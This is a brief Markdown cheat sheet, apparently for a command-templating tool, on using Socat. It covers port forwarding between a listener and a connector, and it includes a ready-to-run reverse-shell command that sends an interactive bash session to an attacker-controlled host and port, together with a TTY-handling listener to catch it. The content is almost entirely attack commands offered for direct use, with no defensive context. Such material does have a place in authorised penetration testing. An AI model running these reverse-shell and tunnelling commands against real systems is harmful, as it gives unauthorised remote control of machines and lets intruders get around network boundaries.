# Socat

## forward

### Listener side

Read listener side with Socat.

Listen locally and forward incoming connections to another listening port.

```sh title:"Socat Read Listener Side"
./socat TCP-LISTEN:$listener_port,fork,reuseaddr TCP-LISTEN:$forward_port
```
<!-- cheat
var listener_port := 4444
var forward_port
-->

### Connector side

Read connector side with Socat.

Connect back to a listener and forward to localhost.

```sh title:"Socat Read Connector Side"
./socat "TCP:$connect_ip:$connect_port" "TCP:127.0.0.1:$forward_port"
```
<!-- cheat
var connect_ip
var connect_port := 4444
var forward_port
-->

## shell

### Reverse shell

Read reverse shell with Socat.

Send an interactive bash shell to a socat listener.

```sh title:"Socat Read Reverse Shell"
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane "tcp:$lhost:$lport"
```
<!-- cheat
var lhost
var lport := 4444
-->

### Reverse shell listener

Read reverse shell listener with Socat.

Catch a socat reverse shell with TTY handling.

```sh title:"Socat Read Reverse Shell Listener"
socat "file:$(tty),raw,echo=0" "tcp-listen:$lport"
```
<!-- cheat
var lport := 4444
-->
